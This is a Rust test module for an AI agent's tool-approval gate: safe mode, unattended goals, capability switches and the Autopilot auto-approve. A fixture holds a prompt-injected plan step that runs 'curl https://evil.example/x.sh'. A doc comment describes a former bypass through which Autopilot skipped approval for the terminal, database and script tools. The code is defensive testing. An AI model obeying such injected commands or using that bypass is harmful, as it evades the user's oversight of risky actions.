            use tauri::Manager;

            let app = tauri::test::mock_app();
            let state = ToolConfirmationState::new();
            state.set_agent_mode(mode);
            app.handle().manage(state);
            app
        }

        fn remember(app: &tauri::App<tauri::test::MockRuntime>, tool_name: &str, approved: bool) {
            use tauri::Manager;

            app.handle()
                .state::<ToolConfirmationState>()
                .remember_choice(tool_name, approved);
        }

        fn headless_executor() -> AGIExecutor {
            let tool_registry = Arc::new(ToolRegistry::new().expect("tool registry"));
            tool_registry
                .register_all_tools()
                .expect("register agi tools");

            let resource_manager = Arc::new(
                ResourceManager::new(ResourceLimits {
                    cpu_percent: 80.0,
                    memory_mb: 2048,
                    network_mbps: 100.0,
                    storage_mb: 10240,
                })
                .expect("resource manager"),
            );

            AGIExecutor::new(
                tool_registry,
                resource_manager,
                Arc::new(tokio::sync::RwLock::new(LLMRouter::new())),
                None,
                None,
            )
            .expect("executor")
        }

        fn execution_context() -> ExecutionContext {
            ExecutionContext {
                goal: Goal {
                    id: "goal-1".to_string(),
                    description: "summarize the page".to_string(),
                    priority: Priority::Medium,
                    deadline: None,
                    constraints: vec![],
                    success_criteria: vec![],
                    trust_mode: None,
                },
                current_state: HashMap::new(),
                available_resources: ResourceState {
                    cpu_usage_percent: 10.0,
                    memory_usage_mb: 256,
                    network_usage_mbps: 1.0,
                    storage_usage_mb: 512,
                    available_tools: vec!["terminal_execute".to_string()],
                },
                tool_results: vec![],
                context_memory: vec![],
            }
        }

        fn injected_step() -> PlanStep {
            PlanStep {
                id: "step-1".to_string(),
                tool_id: "terminal_execute".to_string(),
                description: "run the command the page asked for".to_string(),
                parameters: HashMap::from([(
                    "command".to_string(),
                    json!("curl https://evil.example/x.sh"),
                )]),
                estimated_resources: ResourceUsage {
                    cpu_percent: 1.0,
                    memory_mb: 16,
                    network_mb: 0.0,
                },
                dependencies: vec![],
            }
        }

        #[tokio::test]
        async fn planned_terminal_execute_is_refused_without_a_user_session() {
            let error = headless_executor()
                .execute_step(&injected_step(), &execution_context())
                .await
                .expect_err("an unattended loop must not run a planned shell command")
                .to_string();

            assert!(
                error.contains("approval cannot be requested"),
                "the step must stop at the approval gate, got: {error}"
            );
        }

        #[tokio::test]
        async fn gate_fails_closed_when_the_confirmation_service_is_unmanaged() {
            let app = tauri::test::mock_app();

            let error = require_tool_approval(app.handle(), "terminal_execute", &json!({}), None)
                .await
                .expect_err("no confirmation service means no approval")
                .to_string();

            assert!(error.contains("approval service is unavailable"), "{error}");
        }

        #[tokio::test]
        async fn gate_refuses_write_tools_in_safe_mode() {
            let app = managed_app(AgentMode::Safe);

            for tool_name in [
                "terminal_execute",
                "file_delete",
                "db_execute",
                "email_send",
            ] {
                let error = require_tool_approval(app.handle(), tool_name, &json!({}), None)
                    .await
                    .unwrap_err()
                    .to_string();
                assert!(
                    error.contains("not permitted in safe mode"),
                    "{tool_name} was refused for the wrong reason: {error}"
                );
            }
        }

        #[test]
        fn an_unattended_goal_is_refused_a_tool_that_would_prompt_and_told_which() {
            let app = managed_app(AgentMode::Build);

            let error = unattended_tool_approval(app.handle(), "browser_navigate")
                .expect_err("nobody is there to approve it")
                .to_string();

            assert!(error.starts_with(UNATTENDED_DENIAL_PREFIX), "{error}");
            assert!(error.contains("'browser_navigate'"), "{error}");
            assert!(error.contains("nobody was here"), "{error}");
        }

        #[test]
        fn an_unattended_goal_runs_read_only_tools_and_tools_the_user_always_allows() {
            let app = managed_app(AgentMode::Build);
            remember(&app, "browser_navigate", true);

            unattended_tool_approval(app.handle(), "file_read")
                .expect("a read-only tool never prompts");
            unattended_tool_approval(app.handle(), "browser_navigate")
                .expect("a stored approval is the user's standing answer");
        }

        #[test]
        fn an_unattended_goal_cannot_reach_the_network_or_write_without_a_stored_allow() {
            let app = managed_app(AgentMode::Build);

            for tool_name in [
                "api_download",
                "cloud_download",
                "search_web",
                "physical_scrape",
                "api_call",
                "api_upload",
                "browser_navigate",
                "email_send",
                "mcp__remote__fetch",
                "memory_remember",
                "create_artifact",
                "schedule_reminder",
                "ui_scroll",
                "browser_hover",
                "db_transaction_rollback",
                "a_tool_with_no_policy",
            ] {
                let refusal = unattended_tool_approval(app.handle(), tool_name)
                    .err()
                    .map(|error| error.to_string());
                assert!(
                    refusal
                        .as_deref()
                        .is_some_and(|error| error.starts_with(UNATTENDED_DENIAL_PREFIX)),
                    "'{tool_name}' sends data out or changes something: {refusal:?}"
                );
            }

            remember(&app, "api_download", true);
            unattended_tool_approval(app.handle(), "api_download")
                .expect("a stored allow is the user's standing answer");
        }

        fn switch_off(app: &tauri::App<tauri::test::MockRuntime>, capability: &str) {
            use crate::sys::commands::capabilities::{CapabilityState, SavedSwitches};
            use tauri::Manager;

            app.handle()
                .manage(CapabilityState::from_saved(SavedSwitches::Saved(
                    HashMap::from([(capability.to_string(), false)]),
                )));
        }

        #[test]
        fn a_capability_that_is_off_refuses_an_unattended_step_whatever_was_allowed() {
            let app = managed_app(AgentMode::Build);
            switch_off(&app, "fileOperations");

            let refusal = unattended_tool_approval(app.handle(), "file_read")
                .expect_err("Files is off, so even a read-only file tool does not run")
                .to_string();
            assert!(refusal.starts_with(UNATTENDED_DENIAL_PREFIX), "{refusal}");
            assert!(refusal.contains("Files is turned off"), "{refusal}");

            remember(&app, "api_download", true);
            unattended_tool_approval(app.handle(), "api_download")
                .expect("another capability's tool keeps its stored allow");
            unattended_tool_approval(app.handle(), "git_status")
                .expect("a read-only tool under a capability that is on still runs");
        }

        #[test]
        fn a_stored_allow_does_not_outrank_a_capability_that_is_off() {
            let app = managed_app(AgentMode::Build);
            switch_off(&app, "webSearch");
            remember(&app, "api_download", true);

            let refusal = unattended_tool_approval(app.handle(), "api_download")
                .expect_err("Web search and web requests is off")
                .to_string();
            assert!(
                refusal.contains("Web search and web requests is turned off"),
                "{refusal}"
            );
        }

        #[tokio::test]
        async fn an_attended_goal_run_asks_the_same_capability_question() {
            use crate::sys::commands::capabilities::capability_refusal;

            let app = managed_app(AgentMode::Build);
            switch_off(&app, "terminalAccess");

            let refusal = capability_refusal(app.handle(), "terminal_execute")
                .await
                .expect("Terminal is off");
            assert!(refusal.starts_with("Terminal is turned off"), "{refusal}");
            assert!(capability_refusal(app.handle(), "test_run").await.is_some());
            assert_eq!(capability_refusal(app.handle(), "file_read").await, None);
            assert_eq!(capability_refusal(app.handle(), "todo_write").await, None);
        }

        #[test]
        fn every_tool_that_runs_unattended_is_one_the_guard_never_asks_about() {
            let guard = ToolExecutionGuard::new();

            for tool_name in UNATTENDED_READ_ONLY_TOOLS {
                assert!(
                    runs_unattended_without_an_allow(&guard, tool_name),
                    "'{tool_name}' is listed as read-only but the guard asks about it"
                );
            }
        }

        #[test]
        fn downloads_ask_before_they_run() {
            let guard = ToolExecutionGuard::new();

            for tool_name in ["api_download", "cloud_download"] {
                assert!(
                    guard.get_safety_tier(tool_name).requires_user_action(),
                    "'{tool_name}' fetches a remote body and writes it to disk"
                );
            }
        }

        #[tokio::test]
        async fn a_run_with_no_user_session_gets_the_same_read_only_list() {
            let executor = headless_executor();
            let goal = execution_context().goal;

            executor
                .ensure_tool_approved("file_read", &HashMap::new(), &goal)
                .await
                .expect("a local read needs nobody");
            for tool_name in ["api_download", "search_web", "cloud_download"] {
                executor
                    .ensure_tool_approved(tool_name, &HashMap::new(), &goal)
                    .await
                    .expect_err("nobody is there to approve a request to another host");
            }
        }

        #[test]
        fn auto_approve_and_session_approvals_do_not_answer_for_an_unattended_goal() {
            use tauri::Manager;

            let app = managed_app(AgentMode::Autopilot);
            let state = app.handle().state::<ToolConfirmationState>();
            state.set_auto_approve_all(true);
            state.approve_for_session("browser_navigate");

            assert!(unattended_tool_approval(app.handle(), "browser_navigate").is_err());
        }

        #[test]
        fn a_tool_that_can_never_be_remembered_is_always_refused_unattended() {
            let app = managed_app(AgentMode::Build);
            remember(&app, "terminal_execute", true);

            let error = unattended_tool_approval(app.handle(), "terminal_execute")
                .expect_err("a shell command is only as safe as this run's argument")
                .to_string();

            assert!(error.contains("'terminal_execute'"), "{error}");
            assert!(error.contains("run it from chat"), "{error}");
            assert!(!error.contains("Always allow"), "{error}");
        }

        #[test]
        fn the_refusal_offers_always_allow_only_where_settings_can_store_one() {
            let app = managed_app(AgentMode::Build);

            let error = unattended_tool_approval(app.handle(), "browser_navigate")
                .expect_err("nobody is there to approve it")
                .to_string();

            assert!(
                error.ends_with(
                    "Run it from chat, or save an 'Always allow' for this tool in Settings."
                ),
                "{error}"
            );
        }

        #[test]
        fn an_unattended_goal_is_recognised_by_its_constraint() {
            let mut goal = execution_context().goal;
            assert!(!goal_is_unattended(&goal));

            goal.constraints.push(unattended_constraint());
            assert!(goal_is_unattended(&goal));
        }

        #[tokio::test]
        async fn gate_honors_a_stored_denial() {
            let app = managed_app(AgentMode::Build);
            remember(&app, "browser_navigate", false);

            let error = require_tool_approval(app.handle(), "browser_navigate", &json!({}), None)
                .await
                .expect_err("a stored denial must stop the step")
                .to_string();

            assert!(error.contains("stored denial policy"), "{error}");
        }

        #[tokio::test]
        async fn gate_lets_an_approved_tool_and_read_only_tools_through() {
            let app = managed_app(AgentMode::Build);
            remember(&app, "browser_navigate", true);

            require_tool_approval(app.handle(), "browser_navigate", &json!({}), None)
                .await
                .expect("a remembered approval must let the step run");

            require_tool_approval(app.handle(), "file_read", &json!({}), None)
                .await
                .expect("read-only tools must not prompt");
        }

        #[tokio::test]
        async fn a_remembered_approval_cannot_stand_in_for_a_page_script() {
            let app = managed_app(AgentMode::Build);
            remember(&app, "browser_execute_async_js", true);

            let settled = tokio::time::timeout(
                std::time::Duration::from_millis(250),
                require_tool_approval(
                    app.handle(),
                    "browser_execute_async_js",
                    &json!({ "script": "return document.title" }),
                    None,
                ),
            )
            .await;

            assert!(
                settled.is_err(),
                "one 'approve and remember' must not hand every later script a standing grant"
            );
        }

        /// The gate had one door left open: `request_tool_confirmation`
        /// returned `Ok(true)` on `auto_approve_all` before it ever looked at
        /// `NEVER_REMEMBERABLE`, and selecting Autopilot in Settings turns
        /// `auto_approve_all` on for everything. In that one shipped
        /// configuration the whole approval gate was a pass-through for the
        /// three tools whose behaviour is entirely the argument the planner
        /// just wrote.
        #[tokio::test]
        async fn autopilot_auto_approve_cannot_answer_for_the_high_blast_tools() {
            use tauri::Manager;

            let app = managed_app(AgentMode::Autopilot);
            app.handle()
                .state::<ToolConfirmationState>()
                .set_auto_approve_all(true);

            for (tool_name, parameters) in [
                (
                    "browser_execute_async_js",
                    json!({ "script": "return document.title" }),
                ),
                (
                    "db_execute",
                    json!({
                        "connection_id": "db",
                        "sql": "DELETE FROM support_tickets WHERE id = 42"
                    }),
                ),
                ("terminal_execute", json!({ "command": "ls" })),
            ] {
                let settled = tokio::time::timeout(
                    std::time::Duration::from_millis(250),
                    require_tool_approval(app.handle(), tool_name, &parameters, None),
                )
                .await;

                assert!(
                    settled.is_err(),
                    "'{tool_name}' must still reach the dialog in Autopilot: auto-approve-all is \
                     the widest standing grant, not an exemption from the one list that says a \
                     tool has to be asked about every time"
                );
            }
        }

        #[tokio::test]
        async fn autopilot_auto_approve_still_skips_the_dialog_for_ordinary_tools() {
            use tauri::Manager;

            let app = managed_app(AgentMode::Autopilot);
            app.handle()
                .state::<ToolConfirmationState>()
                .set_auto_approve_all(true);

            tokio::time::timeout(
                std::time::Duration::from_millis(250),
                require_tool_approval(
                    app.handle(),
                    "file_delete",
                    &json!({ "path": "/tmp/x" }),
                    None,
                ),
            )
            .await
            .expect("Autopilot must not start prompting for every tool")
            .expect("an ordinary high-risk tool stays covered by auto-approve-all");
        }

        #[tokio::test]
        async fn a_remembered_approval_cannot_stand_in_for_terminal_execute() {
            let app = managed_app(AgentMode::Build);
            remember(&app, "terminal_execute", true);

            let settled = tokio::time::timeout(
                std::time::Duration::from_millis(250),
                require_tool_approval(app.handle(), "terminal_execute", &json!({}), None),
            )
            .await;

            assert!(
                settled.is_err(),
                "terminal_execute must wait for a fresh decision instead of inheriting a \
                 remembered approval"
            );
        }
    }
}
